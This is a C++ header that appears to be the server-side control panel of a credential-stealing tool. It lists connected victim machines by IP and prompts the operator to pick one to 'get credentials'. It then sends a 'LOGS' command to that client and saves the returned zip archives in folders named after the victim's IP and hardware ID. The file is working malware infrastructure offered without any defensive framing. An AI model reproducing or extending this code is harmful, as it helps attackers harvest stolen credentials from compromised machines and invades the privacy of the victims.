#pragma once
#undef max
#include <string>
#include <sstream>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <cstdlib>
#include <limits>
#include <atomic>

#include "Connection.hpp"
#include <Network.hpp>

namespace Helper {

    static std::atomic<bool> Isrunning(false);
    static void PrintClients();

    static void WriteLogs(std::string ip, std::string hwid, std::vector<uint8_t>& data)
    {
        std::string directoryName = ip + "_" + hwid;
        std::filesystem::create_directories(directoryName);

        std::filesystem::path file = (directoryName + "\\logs.zip");
        if (std::filesystem::exists(file)) {
            int count = 0;
            std::filesystem::path temPath;
            do
            {
                count++;
                temPath = std::filesystem::path(directoryName + "\\logs"+"("+std::to_string(count)+").zip");
            } while (std::filesystem::exists(temPath));
            std::fstream fs(temPath, std::ios::binary | std::ios::app);
            if (fs.is_open()) {
                fs.write(reinterpret_cast<const char*>(data.data()), data.size());
                fs.close();
            }
        }
        else {
            std::fstream fs(file, std::ios::binary | std::ios::app);
            if (fs.is_open()) {
                fs.write(reinterpret_cast<const char*>(data.data()), data.size());
                fs.close();
            }
        }
    }

    static void UserInput()
    {
        Isrunning.store(true);
        int choice = 0;

        while (choice == 0)
        {
            // Prompt the user for choice
            std::cout << "Enter client number to get credentials: ";
            std::cin >> choice;

            // Check if input is valid
            if (std::cin.fail()) {
                std::cin.clear(); // Clear error flag
                std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n'); // Discard invalid input
                std::cout << "Invalid input. Please enter a number.\n\n";
                continue;
            }

            if (choice > 0 && choice <= Connection::max_clients) {
                std::cout << "You chose Client " << choice << std::endl;
                std::thread(Connection::Packet::Send, Connection::ServerSocket::Clients[choice-1].ssl, Network::EncodeToBytes("LOGS")).detach();
                std::this_thread::sleep_for(std::chrono::seconds(1));
            }

        }
        Isrunning.store(false);
        PrintClients();
    }

    void PrintClients()
    {
        system("cls"); // Clear console screen
        bool tmp = false; // at least one client is active
        for (int i = 0; i < Connection::max_clients; i++)
        {
            if (Connection::ServerSocket::Clients[i].socket != 0)
            {
                std::cout << "[" << i + 1 << "] " << Connection::ServerSocket::Clients[i].ip << std::endl;
                tmp = true;
            }
        }
        if (tmp && !Isrunning.load()) {

            std::thread(UserInput).detach();
        }
    }

    static bool fileExists(const std::string& filename) {
        std::ifstream file(filename);
        return file.good();
    }
}
